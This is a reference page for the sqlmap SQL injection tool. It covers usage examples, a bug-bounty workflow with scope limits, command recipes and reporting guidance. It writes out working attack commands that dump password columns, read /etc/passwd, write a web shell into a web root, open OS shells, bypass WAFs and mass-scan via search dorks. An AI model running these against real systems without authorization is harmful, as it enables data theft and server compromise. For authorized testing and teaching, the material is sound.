---
name: "sqlmap"
categories:
  - database
  - exploitation
  - top10
  - web
version: "1.10.10-1"
homepage: "https://sqlmap.org"
origin: "arch"
arch-repo: "extra"
packaged-by: [arch, kali, nixpkgs]
arch-builddate: "2026-10-11"
build-system: other
meta-checked: "2026-11-09"
github-repo: "sqlmapproject/sqlmap"
github-stars: 38876
github-pushed: "2026-11-06"
github-archived: false
github-issues: 14
github-match: "search"
gh-checked: "2026-11-07"
worth: 9.1
worth-basis: "full (activity+popularity+recency+adoption)"
worth-checked: "2026-11-09"
last-refresh: "2026-11-19"
github-commits-year: 805
gh-activity-checked: "2026-11-09"
---

# sqlmap

> Automatic SQL injection detection and exploitation for database-backed web applications.

## What it's for

sqlmap finds SQL injection flaws in web applications and then automates
everything that follows: fingerprinting the back-end DBMS, enumerating
databases, tables and columns, dumping data (with on-board password hash
cracking), reading and writing files on the database host, and — where
privileges allow — running arbitrary SQL statements or an interactive
operating-system shell. Give it a URL or a saved HTTP request and it handles
the injection mechanics; options steer what gets tested and how hard. It
speaks plain HTTP(S) as well as WebSocket endpoints, replays cookies and
other headers for authenticated targets, and can route traffic through a
proxy or SOCKS chain to reach pivoted hosts. It does not decide
authorization for you: it is a loud, deliberately aggressive tool for
systems you are explicitly allowed to test.

## Typical use cases

### Test a URL parameter directly

Point it at a single GET parameter when the target is already known.

```
sqlmap -u "http://target.example.com/item.php?id=1" -p id --batch
```

Outcome: probes the `id` parameter across its technique set (boolean-based,
time-based, error-based, UNION, stacked queries) and prints every injection
point found with its type, the DBMS, and usable payloads; `--batch` accepts
the default answer at every prompt so the run needs no interaction.

### Replay a request captured by a proxy

Reproduce an authenticated or POST-based request exactly as captured.

```
sqlmap -r request.req --batch
```

Outcome: loads the raw HTTP request file (method, headers, cookies, POST
body) and tests every parameter in it — the reliable way to attack
multi-header, authenticated endpoints. Appending `*` to a value inside the
file forces sqlmap to treat that exact spot as the injection point instead
of auto-discovering parameters.

### Enumerate databases, tables, and dump them

Walk the standard enumeration chain once an injection is confirmed.

```
sqlmap -r request.req --batch --dbs
sqlmap -r request.req --batch -D shop --tables
sqlmap -r request.req --batch -D shop -T users -C email,password --dump
```

Outcome: lists the back-end databases, then the tables inside `-D shop`,
then dumps the `email` and `password` columns of `shop.users`. `--dump`
also tries to crack password hashes against sqlmap's bundled wordlist and
stores all results under the per-target session output directory.

### Test POST parameters and JSON bodies

Switch the attack from GET query strings to request bodies.

```
sqlmap -u "http://target.example.com/login" --data "username=user&password=Password1" --batch
sqlmap -u "http://target.example.com/api/search" --data '{"id": "*"}' --batch
```

Outcome: `--data` sends the string as a POST body and tests its parameters;
in the second form the `*` marks the injectable value inside a JSON
structure. The same mechanism works for XML bodies and for `ws://`
WebSocket targets (requires the `websocket-client` Python package).

### Attack an endpoint behind authentication

Reach injection points that only exist for logged-in sessions.

```
sqlmap -u "http://target.example.com/logs.php?name=admin" --cookie "auth=SESSIONVALUE" --batch --dbs
```

Outcome: sends the supplied session cookie with every request so testing
happens as the authenticated user. Add `--level 2` or higher to also treat
cookie and other HTTP header values themselves as candidate injection
points.

### Tune detection breadth and aggressiveness

Make a scan faster, quieter, or more thorough on a known DBMS.

```
sqlmap -u "http://target.example.com/search?q=test" --dbms mysql --level 3 --risk 2 --technique BT --threads 4 --batch
```

Outcome: `--level` widens which places get tested (1: GET/POST parameters,
2: + cookie values, 3: + HTTP headers), `--risk` raises payload
aggressiveness (1-3), `--dbms` skips non-MySQL tests, `--technique` limits
injection types (any of B/E/U/S/T/Q), and `--threads` parallelizes
requests. Add `--fresh-queries` to ignore cached results from an earlier
session against the same target.

### Bypass input filters with tamper scripts

Reshape payloads when a WAF or filter mangles them.

```
sqlmap -u "http://target.example.com/search?q=test" --tamper=space2comment --batch
```

Outcome: every payload passes through the `space2comment` tamper script
(replacing spaces with inline comments) before being sent. sqlmap ships a
library of tamper scripts in its `tamper/` directory, accepts custom
scripts by path, and chains several comma-separated.

### Read and write files on the database host

Abuse DBMS file privileges through the injection.

```
sqlmap -r request.req --file-read "/etc/passwd" --batch
sqlmap -r request.req --file-write shell.php --file-dest "/var/www/html/shell.php" --batch
```

Outcome: `--file-read` pulls a server-side file into the session output
directory; `--file-write` with `--file-dest` pushes a local file to an
absolute path on the server. Both need the DBMS account to hold the
relevant privileges (e.g. MySQL's `FILE` grant).

### Run arbitrary SQL or get an OS shell

Escalate from injection to direct query execution and code execution.

```
sqlmap -r request.req --sql-query "SELECT user, password FROM mysql.user" --batch
sqlmap -r request.req --os-shell --batch
```

Outcome: `--sql-query` executes one statement through the injection and
prints the returned rows; `--os-shell` attempts file-write plus
stacked-query escalation to drop an interactive shell prompt on the web
server host. Both depend on the DBMS, its privileges, and the injection
techniques available.

### Mark a header as the injection point

Pin the test to one header value when auto-discovery misses it.

```
sqlmap -u "http://target.example.com/" --headers="X-Forwarded-For:127.0.0.1*" --batch
```

Outcome: appending `*` (the custom injection mark) to a value inside `--headers`, `--cookie`, or `--data` tells sqlmap to attack that exact spot — here the client-IP header many applications trust for logging or rate-limiting — instead of relying on `--level` placement sweeps; `--method=PUT` (short form `-X PUT`) forces a non-GET verb for the same request.

### Test second-order (stored) injection

Inject through one request and detect the result on another page.

```
sqlmap -r register.req -p bio --second-req profile.req --batch
```

Outcome: the payload goes into the first request's `bio` parameter; sqlmap then replays the second request file (`--second-req`; `--second-url` takes a URL instead) and looks for the injected value's effects there — the pattern for values stored by one endpoint and rendered by another. The older `--second-order` option seen in legacy references was replaced by these two.

### Calibrate boolean detection with --string / --not-string

Fix detection when the application returns the same page for true and false.

```
sqlmap -r request.req -p id --not-string="no results" --batch
```

Outcome: `--not-string` declares a marker whose presence means the condition evaluated False (and `--string` the True marker), so boolean-based inference keys on content you have verified instead of sqlmap's statistical heuristics — the cure for pages whose response body barely changes.

### Crawl a site and test every discovered form

Hand sqlmap the whole attack surface instead of one URL.

```
sqlmap -u "http://target.example.com/" --crawl=1 --forms --random-agent --batch
```

Outcome: `--crawl` follows links from the target up to the given depth, `--forms` parses every encountered form and prompts for (or, with `--batch`, auto-selects) which to test, and `--random-agent` picks a browser User-Agent; the run reports each form-backed injection point found — the quick surface pass before targeted enumeration.

### Recompute a parameter per request with --eval

Feed dynamic values — signatures, hashed ids — that must be derived for every payload.

```
sqlmap -u "http://target.example.com/item?id=1" --eval="import hashlib; id=hashlib.md5(id).hexdigest()" -p id --batch
```

Outcome: the Python snippet in `--eval` runs before each request with the current parameter values in scope, so `id` is re-hashed on the fly and the application always receives a valid derived value; the same hook re-signs session cookies per request, e.g. re-signing a Flask session cookie with a recovered secret before every probe.

---

## Bug bounty workflow with sqlmap

sqlmap is the loudest tool in a bug hunter's kit. Left to its defaults it sends
tens to thousands of payloads per parameter, cracks hashes, and — if you let it —
writes files and opens shells. On an authorized program that discipline is the
difference between a paid Critical and a ban for "automated scanning / out-of-scope
impact." Everything below is single-target, low-volume, and evidence-first. Work
the phases in order on a fresh finding; never skip Phase 0.

### Phase 0 — Authorization and scope gate (before the first request)

Read the program's rules of engagement and answer four questions *in writing to
yourself* before you type `sqlmap`:

- **Is SQL injection in scope, and is automated tooling allowed?** Many programs
  explicitly forbid automated scanners, or require a reduced rate. sqlmap is an
  automated scanner. If the program bans them, you discover the injection by hand
  and use sqlmap only to confirm a *single* parameter at `--threads 1`.
- **What is the extraction ceiling?** Most programs want proof of injection, not a
  data dump. "Demonstrate access to one non-sensitive value" is the norm. Plan to
  stop at `version()`/`current_user`, not at the customer records table.
- **Is state change / RCE permitted?** `--os-shell`, `--os-pwn`, `--file-write`,
  stacked `--sql-query` writes, and `--risk 3` all modify the target. Assume **no**
  unless the RoE says yes in words.
- **What is the rate limit?** Translate it into `--delay` and `--threads`. If the
  program says "max 5 req/s," you are at `--threads 1 --delay 0.2` *at most*, and
  realistically slower because each sqlmap payload is one request.

### Phase 1 — Capture, don't guess

The reliable entry point is a real request, not a hand-typed URL. Proxy the target
through Burp/ZAP, exercise the suspicious feature as the authenticated user, then
*Copy to file* (Burp: right-click → Copy to file, or save the raw request). Feed
that file with `-r`:

```
sqlmap -r search.req --batch --technique=B --level 1 --risk 1 --threads 1
```

Feeding `-r` preserves method, every header, the exact cookie jar, the
`Content-Type`, and the body byte-for-byte — so you test the endpoint *as the
application actually sees it*, including CSRF tokens and auth headers that a
`-u` URL would drop. Pin the suspected parameter with the injection mark `*`
inside the file (e.g. `id=42*` or `{"q":"*"}`) so sqlmap attacks that one spot
instead of sweeping all parameters. Then hand the same `.req` file to the
triager — it is the single most reproducible artifact you can submit.

For anti-CSRF-protected forms, let sqlmap refresh the token each request with
`--csrf-token=<field>` and `--csrf-url=<url>` rather than fighting 403s.

### Phase 2 — Low-and-slow detection

The first pass is deliberately conservative. Constrain everything:

```
sqlmap -r search.req -p q \
  --level 1 --risk 1 \
  --technique=BEU \
  --threads 1 --delay 0.5 --timeout 30 --retries 2 \
  --batch
```

- `--level 1 --risk 1` are the defaults and the floor — start here.
- `--technique=BEU` excludes **S** (stacked queries) and **T** (time-based) on the
  first pass: stacked queries are the path to writes/RCE and you do not want them
  fired accidentally, and time-based is the noisiest, slowest, most false-positive-
  prone family. Add them deliberately later if the in-band families find nothing.
- `--threads 1 --delay 0.5` keeps you well under any sane rate limit. sqlmap caps
  `--threads` at 10 (the `MAX_NUMBER_OF_THREADS` constant in `lib/core/settings.py`);
  for bounty work you almost never want more than **2**, and 1 with a `--delay` is
  the courteous default on production.
- Add `--dbms=mysql` (or `postgresql`, `mssql`, `oracle`) the moment you know the
  back end — it stops sqlmap from firing every other DBMS's payloads, cutting
  request volume by more than half.

### Phase 3 — The level / risk escalation ladder

Escalate only when a lower rung finds nothing and you still have a reason to
believe the parameter is injectable. Each rung is more requests and more
intrusive payloads.

| Rung | Setting | What it adds | When to climb |
|---|---|---|---|
| 1 | `--level 1` (default) | GET/POST parameters only | always start here |
| 2 | `--level 2` | + `Cookie` header values | parameter clean, but session cookies look dynamic/reflected |
| 3 | `--level 3` | + `User-Agent` and `Referer` headers | app logs/echoes UA or Referer (analytics, audit tables) |
| 5 | `--level 5` | + `Host` header | last resort; host-routing/multi-tenant lookups |

| Rung | Setting | What it adds | Caution |
|---|---|---|---|
| 1 | `--risk 1` (default) | basic boolean + inline, "harmless" payloads | safe on production |
| 2 | `--risk 2` | + heavier time-based query tests | adds load; one blocked worker per probe |
| 3 | `--risk 3` | + **OR-based** payloads | **can modify data** — an `OR`-based payload on an `UPDATE ... WHERE` or `DELETE ... WHERE` matches *every* row. Never on production without explicit written permission |

The payload count scales steeply: a single parameter draws on the order of ~70
payloads at `--level 1 --risk 1` and thousands at `--level 5 --risk 3`
(community measurements put the top end near ~7,800). Climbing the whole ladder
on every parameter is exactly the behavior that gets a hunter rate-limited,
blocked, or reported as abusive. Climb one rung at a time, on one parameter, for
a stated reason.

### Phase 4 — Confirm and fingerprint with minimal impact

Once sqlmap reports an injection point, the goal flips from *finding* to
*proving*, with the smallest possible footprint. These read one scalar each and
touch no application data:

```
sqlmap -r search.req -p q --batch \
  --banner --current-user --current-db --hostname --is-dba
```

- `--banner` — DBMS name and version string (proves code execution in the DB).
- `--current-user` / `--current-db` — identity and database context.
- `--is-dba` — whether the injection runs as a DB admin (severity multiplier;
  reported, not exploited).

For scale evidence without exfiltration, count before you ever dump:

```
sqlmap -r search.req -p q --batch -D appdb --tables
sqlmap -r search.req -p q --batch -D appdb -T users --count
```

`--count` returns row counts per table — enough to establish "this injection
reaches a table of 2.3M user records" without pulling a single record.

### Phase 5 — Proof of impact without over-extraction

If the program requires a concrete data sample, extract the *minimum* that proves
cross-boundary read, and redact it. One row, non-sensitive columns, bounded:

```
sqlmap -r search.req -p q --batch \
  -D appdb -T users -C id,email --start 1 --stop 1 --dump
```

`--start 1 --stop 1` limits the dump to a single entry; `-C id,email` limits the
columns. That is a proof, not a breach. Never run `--dump` on a whole table,
`--dump-all`, or `-a/--all` on a production program — those are data-exfiltration
actions, not proofs, and triage will reject the report (and may treat it as an
incident). If the data is inherently sensitive (PII, secrets), prefer a
structural proof instead — table and column names via `--schema` plus `--count` —
and say in the report that you deliberately did not read the rows.

### Phase 6 — The stop line (what NOT to run)

On a standard web bug bounty, your job ends at demonstrated read access. The
following cross from "proof" into "intrusion" and are rejected or punished by most
programs unless the RoE explicitly authorizes them:

- `--os-shell`, `--os-cmd`, `--os-pwn` — these achieve RCE by writing a web shell
  (`INTO OUTFILE` to the web root on MySQL), enabling `xp_cmdshell` via
  `sp_configure` on MSSQL, or creating a UDF / `COPY ... FROM PROGRAM` on
  PostgreSQL. All modify server state. See the dedicated note below.
- `--file-write` / `--file-dest` — plants a file on the target; destructive and
  almost never in scope.
- Stacked-query writes via `--sql-query` (`INSERT`/`UPDATE`/`DELETE`/`DROP`).
- `--passwords` followed by actually cracking and *using* credentials — recovering
  hashes may be in scope; logging into accounts is a separate, usually forbidden,
  act.
- `--risk 3` on any `UPDATE`/`DELETE`-reachable parameter.

If the injection is clearly stacked-query-capable or `--is-dba` returns `True`,
that is a severity argument you make *in prose in the report* — not a shell you
open to prove it.

### Phase 7 — Report (next sections)

Capture the evidence (see *Reporting evidence*), write impact-first, attach the
`.req` file and the exact command, and submit.

## Where the money is with sqlmap

| Priority | Finding class | sqlmap feature / command that reaches it | Typical severity | Dupe / FP risk |
|---|---|---|---|---|
| 1 | In-band SQLi (UNION or error-based) on an unauthenticated parameter | `--technique=UE`, confirmed by reflected rows / DB error with marker | Critical | **High** — scanners find these within hours of a new endpoint |
| 2 | Authenticated SQLi reachable only with a valid session | `-r authed.req` with live `--cookie`/headers | High–Critical | Lower — needs the captured session, so fewer hunters reach it |
| 3 | Blind SQLi (boolean-based) | `--technique=B` + `--string`/`--not-string` to anchor the oracle | High | Medium — slower to find, so less duped |
| 4 | Time-based blind SQLi | `--technique=T`, confirm with rising `--time-sec` | High | Medium dupe, **high FP** — must be proven repeatable |
| 5 | Second-order / stored SQLi | `--second-req`/`--second-url` | High | **Low** — most scanners can't model two-request injection |
| 6 | SQLi in an HTTP header (UA, Referer, XFF, Host) | `--level 3`/`5`, or mark the header value with `*` | High–Medium | Low — placement sweeps are off by default |
| 7 | SQLi in a JSON/XML API body | `--data '{"q":"*"}'` or `-r` with the body | High | Medium |
| 8 | WAF-only-blocked SQLi recovered via tampering | `--tamper=...` chain | High | **Low** — the WAF hides it from most hunters |
| 9 | Stacked-query-capable injection (write/RCE potential) | detected under `--technique=S` (report, don't exploit) | Critical (as impact argument) | Low |

The pattern: **in-band bugs pay the most but dupe the fastest**; your edge is the
classes scanners miss — second-order, header-placement, body-nested, and
WAF-masked injections. Those are where `-r`, placement marks, `--second-req`, and
`--tamper` earn their keep.

## Command recipes

Each block is a real invocation with the low-volume settings called out and the
output you should expect.

### Conservative confirmation of one parameter

```
sqlmap -r order.req -p order_id \
  --technique=BEU --level 1 --risk 1 \
  --threads 1 --delay 0.5 --batch --flush-session
```

Expected: sqlmap prints, for each confirmed vector, a block like —

```
sqlmap identified the following injection point(s):
---
Parameter: order_id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: order_id=42 AND 5723=5723
    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: order_id=42 UNION ALL SELECT NULL,CONCAT(0x7176...),NULL-- -
---
[INFO] the back-end DBMS is MySQL
```

`--flush-session` forces a clean run (ignores cached results) so what you capture
is reproducible from scratch — important for the report. Copy this block verbatim;
it is your core evidence.

### Anchor a blind boolean oracle

```
sqlmap -r search.req -p q --technique=B \
  --string="Results for" \
  --threads 1 --delay 0.5 --batch
```

`--string` names text present only when the injected condition is **True**
(`--not-string` names text present only when False). This replaces sqlmap's
statistical page-diffing with a marker you verified by hand — the cure for pages
that barely change between true and false, and the way you kill false positives on
boolean-based findings before reporting.

### Prove, don't plunder

```
# identity + version, no application data touched
sqlmap -r search.req -p q --batch --banner --current-user --is-dba
# scale without exfiltration
sqlmap -r search.req -p q --batch -D appdb -T customers --count
# single-row, bounded, redactable proof
sqlmap -r search.req -p q --batch -D appdb -T customers -C id,city --start 1 --stop 1 --dump
```

Expected: a one-line banner (`5.7.44-0ubuntu0.20.04.1`), a username
(`appuser@localhost`), `current user is DBA: False`, a count
(`[12,418 entries]`), and a one-row table. That sequence is a complete,
minimal-impact proof chain.

### WAF present: fingerprint, then tamper

```
sqlmap -r search.req -p q --batch --list-tampers        # see the catalogue
sqlmap -r search.req -p q --batch \
  --tamper=between,randomcase,space2comment \
  --technique=B --threads 1 --delay 1 --random-agent
```

sqlmap auto-detects many WAFs and will tell you which it thinks is in front
(`--skip-waf` disables that probe if it adds noise you don't want). Tamper scripts
reshape each payload before it is sent: `space2comment` swaps spaces for `/**/`,
`between` rewrites `>`/`=` comparisons, `randomcase` randomizes keyword case,
`charencode` URL-encodes, `base64encode` wraps values. Chain them comma-separated,
simplest first. Caveat: tampering does not reduce request count — it can *raise*
it (more variants tried), so keep `--delay` up and `--threads` down. `--random-agent`
rotates the User-Agent from sqlmap's bundled list, which some basic filters key on.

### Route everything through your proxy (for evidence + control)

```
sqlmap -r search.req -p q --batch --proxy="http://127.0.0.1:8080" --parse-errors
```

Routing through Burp gives you a complete, reviewable request/response log to
attach to the report, and a kill switch (drop the proxy to stop traffic instantly).
`--parse-errors` surfaces DBMS error text sqlmap sees — useful corroboration for an
error-based finding.

### DBMS-specific confirmation paths

The injection type sqlmap can use, and the proof you can safely show, depend on the
back end:

- **MySQL / MariaDB** — error-based via `updatexml()`/`extractvalue()`, plus UNION
  when output reflects. Stacked queries are usually *unavailable* through the common
  `mysqli`/PDO single-statement drivers, so `--os-shell` here relies on `INTO
  OUTFILE` writing a web shell into a writable web root (needs `FILE` privilege and
  a known path) — intrusive, out of scope by default. Minimal proof: `--banner`,
  `@@version`, `current_user()`.
- **PostgreSQL** — supports stacked queries, so it is the most "escalatable" and the
  one to be most careful with. `--os-shell` uses a UDF (library creation) or
  `COPY ... FROM/TO PROGRAM` on modern versions. Stop at `version()` and
  `current_user` for a bounty.
- **Microsoft SQL Server** — stacked queries supported; `--os-cmd`/`--os-shell`
  re-enable and drive `xp_cmdshell` via `sp_configure`. This is a classic but it
  *changes server configuration* — never on production. Proof: `@@version`,
  `SYSTEM_USER`, `--is-dba`.
- **Oracle** — no stacked queries through typical drivers, so write/RCE paths are
  mostly closed; error-based leans on `CTXSYS.DRITHSX.SN`, `utl_inaddr`, or
  `dbms_xmlgen`. Proof: `--banner`, `SELECT user FROM dual` via `--current-user`.

Force the right engine with `--dbms=<name>` once identified to cut noise.

### Never do this on a wide target list

```
# DANGER — do NOT run on a bounty program:
sqlmap -g "inurl:item.php?id=" --batch            # dork-sourced mass scanning
sqlmap -m targets.txt --batch --level 5 --risk 3  # bulk file, max aggression, no prompts
```

`-g` (Google dork) and `-m` (bulk target file) combined with `--batch` auto-attack
every host they resolve — a guaranteed scope violation the moment one host is not
in your program, and indistinguishable from mass exploitation. `--batch` is for
*one* authorized target at a time. Keep it off any multi-target input.

## Pitfalls, noise and scope discipline

How hunters get reports rejected — or get banned — with this tool, and the settings
that prevent it:

- **Running defaults on production.** Default sqlmap will, over a full run, send
  thousands of requests, attempt every DBMS, and try every technique including
  stacked queries. Scope it: `-p <param>`, `--dbms=<known>`, `--technique=<subset>`,
  `--threads 1`, `--delay`. Confirm one parameter, then stop.
- **`--risk 3` on a write path.** OR-based payloads (`... OR 2765=2765`) appended to
  an `UPDATE`/`DELETE` statement's `WHERE` clause match every row — a `--risk 3`
  scan can silently modify or delete the whole table. This is the single most
  destructive default misuse. Keep `--risk 1` on production; escalate only with
  written authorization and preferably against a staging instance.
- **Dumping the database as "proof."** `--dump` on a full table, `--dump-all`, and
  `-a/--all` exfiltrate real data. Triage reads that as the incident, not the
  report. Prove with `--count` + a single bounded `--dump`; never more.
- **Opening a shell to "show impact."** `--os-shell`/`--os-pwn`/`--file-write`
  modify the target and routinely exceed scope even on programs that accept SQLi.
  Argue the impact in prose; do not execute it.
- **Time-based false positives.** A congested network or a slow endpoint fakes the
  delay signal. Before reporting a time-based-only finding, re-run with rising
  `--time-sec` (5, then 10, then 15) and show the response time tracks the delay
  you injected. An unconfirmed time-based bug is the classic rejected sqlmap report.
- **Mass scanning via `-g`/`-m --batch`.** Covered above — this reaches hosts you
  were never authorized to touch.
- **Ignoring the rate limit / WAF ban.** Threads up + no delay trips rate limits and
  WAF blocks, poisoning the endpoint for the rest of your test (and flagging your
  IP). `--threads 1 --delay`, `--random-agent`, and minimal `--tamper` keep you
  under the radar; back off the moment you see 429/403 patterns change.
- **Testing without a real request.** A hand-typed `-u` URL drops the cookies,
  CSRF token, and headers that the vulnerable code path actually needs, producing
  false negatives. Capture with a proxy and use `-r`.

## Reporting evidence

The report is the deliverable. A triager must be able to reproduce the finding
from what you submit, without guessing. Capture and include:

- **The exact command**, verbatim, including every flag (`-r`, `-p`, `--technique`,
  `--dbms`, `--level`/`--risk`). The flags *are* the methodology.
- **The captured request file** (`.req`) you fed to `-r`, with credentials/session
  tokens redacted but structure intact — this is the most reproducible artifact.
- **sqlmap's injection-point block** verbatim: the parameter, the injection
  **Type** (boolean-based blind / error-based / UNION query / stacked queries /
  time-based blind / inline query), the **Title**, and the **Payload** line. The
  Type tells the triager the evidence class; the Payload lets them replay it by hand.
- **The fingerprint proof**: `--banner` output, `--current-user`, `--current-db`,
  `--is-dba`. These show code execution in the DB without touching app data.
- **Scale, not contents**: `--count` output ("table `customers`: 12,418 entries")
  establishes impact; a single redacted `--start 1 --stop 1 --dump` row confirms
  readability. State explicitly that you limited extraction to one row on purpose.
- **A matching request/response pair** from your proxy (run with
  `--proxy=http://127.0.0.1:8080`) showing the payload going out and the
  differential/error/timing coming back — the raw evidence behind sqlmap's verdict.
- **The session log**: sqlmap writes everything to its per-target output directory
  (printed at startup; recent versions under `~/.local/share/sqlmap/output/<host>/`,
  including `log` and the `dump/` folder). Attach the relevant log excerpt.
- **Evidence standard by technique** — state which applies and show it:
  boolean-based needs the True/False differential (anchor it with
  `--string`/`--not-string`); error-based needs the DBMS error text containing your
  marker (`--parse-errors`); UNION needs the reflected rows; time-based needs the
  *repeatable* delay-vs-baseline measurement across rising `--time-sec`; stacked
  needs the support-test result (report it, do not fire writes).

Write the title impact-first — "Unauthenticated UNION SQL injection in
`GET /api/items?order_id=` exposes the full `appdb.customers` table (12,418 rows)" —
state preconditions, give the copy-pasteable command and `.req`, show expected vs.
actual, and close with a remediation paragraph (parameterized queries / prepared
statements; allowlist for any dynamic SQL structure like `ORDER BY`). Map severity
to the program's rubric and cite the back-end DBMS and privilege level you proved.

## References

- sqlmap — official site: https://sqlmap.org
- sqlmap — repository and README: https://github.com/sqlmapproject/sqlmap
- sqlmap wiki — Usage (full option reference): https://github.com/sqlmapproject/sqlmap/wiki/Usage
- sqlmap wiki — Techniques (the six SQL injection types and their evidence): https://github.com/sqlmapproject/sqlmap/wiki/Techniques
- sqlmap wiki — FAQ: https://github.com/sqlmapproject/sqlmap/wiki/FAQ
- sqlmap man page (Debian, option defaults): https://manpages.debian.org/testing/sqlmap/sqlmap.1
- `MAX_NUMBER_OF_THREADS = 10` thread cap (sqlmap source, `lib/core/threads.py`, Debian 1.10): https://sources.debian.org/data/main/s/sqlmap/1.10-1/lib/core/threads.py
- OWASP — SQL Injection: https://owasp.org/www-community/attacks/SQL_Injection

*Research supplement added 2026-11-15, grounded in the sqlmap Usage and Techniques wikis, the project README/site, the Debian man page and packaged 1.10 source (thread cap), and OWASP's SQL injection reference (model: claude-opus-4-8).*
